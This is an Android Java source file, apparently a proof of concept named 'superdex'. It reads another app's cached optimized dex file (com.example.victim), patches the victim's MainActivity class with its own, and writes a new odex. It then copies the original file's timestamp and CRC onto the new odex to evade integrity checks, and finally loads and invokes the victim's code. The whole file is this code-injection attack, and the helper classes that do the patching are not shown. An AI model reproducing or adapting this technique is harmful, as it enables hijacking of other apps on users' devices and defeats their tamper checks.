package com.catfish.superdex;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;

import android.app.Activity;
import android.content.Context;
import android.content.res.AssetManager;
import android.os.Bundle;
import android.util.Log;

import com.catfish.superdex.dexfixer.DexMerger;
import com.catfish.superdex.utils.LogUtil;

import dalvik.system.DexClassLoader;

public class MainActivity extends Activity {
    private static final String DEX_LIB = "bytecode.dex";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        transferFiles(this, DEX_LIB);
        refineDex();
        testNewDex();
    }

    private void refineDex() {
        String[] args = new String[7];
        args[0] = "/data/dalvik-cache/data@app@com.example.victim-1.apk@classes.dex";
        args[1] = "/data/data/com.catfish.superdex/files/classes.dex";
        args[2] = "/data/data/com.catfish.superdex/";
        args[3] = "/data/data/com.catfish.superdex/cache/";
        args[4] = "Lcom/example/victim/MainActivity;";
        args[5] = "Lcom/catfish/superdex/MainActivity;";
        args[6] = "/data/data/com.catfish.superdex/cache/data@app@com.example.victim-1.apk@classes.dex";

        DexMerger df = new DexMerger(args[0], args[1]);
        df.patchTargetDex(args[4], args[5]);
        String outFile = df.createNewOdex(args[2], args[3]);
        new DexClassLoader(outFile, args[3], null, ClassLoader.getSystemClassLoader());
        DexMerger.fixOdexTimeStampAndCrc(args[0], args[6]);
    }

    private void testNewDex() {
        ClassLoader cl = new DexClassLoader("/data/data/com.catfish.superdex/data@app@com.example.victim-1.apk@classes.dex", "/data/data/com.catfish.superdex/cache", null,
                ClassLoader.getSystemClassLoader());
        try {
            Class<?> clz = cl.loadClass("com.example.victim.MainActivity");
            Object app = clz.newInstance();

            Method m = clz.getDeclaredMethod("onCreate", Bundle.class);
            m.setAccessible(true);
            m.invoke(app, new Bundle());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private final String transferFiles(Context context, String filename) {
        AssetManager assetManager = context.getAssets();
        try {
            String path = context.getFilesDir() + "/";
            File file = new File(path + filename);
            if (!file.exists()) {
                file.createNewFile();
            }
            if (file.lastModified() > new File(context.getPackageCodePath()).lastModified()) {
                return file.getAbsolutePath();
            }
            FileOutputStream fos = new FileOutputStream(path + filename);
            InputStream inputStream = assetManager.open(filename);
            byte[] buffer = new byte[8192];
            int count = 0;
            while ((count = inputStream.read(buffer)) != -1) {
                fos.write(buffer, 0, count);
            }
            fos.flush();
            fos.close();
            inputStream.close();
            return file.getAbsolutePath();
        } catch (IOException e) {
            Log.e(LogUtil.TAG, "transfer files failed", e);
        } catch (Exception e) {
            Log.e(LogUtil.TAG, "transfer files failed", e);
        }
        return null;
    }
}
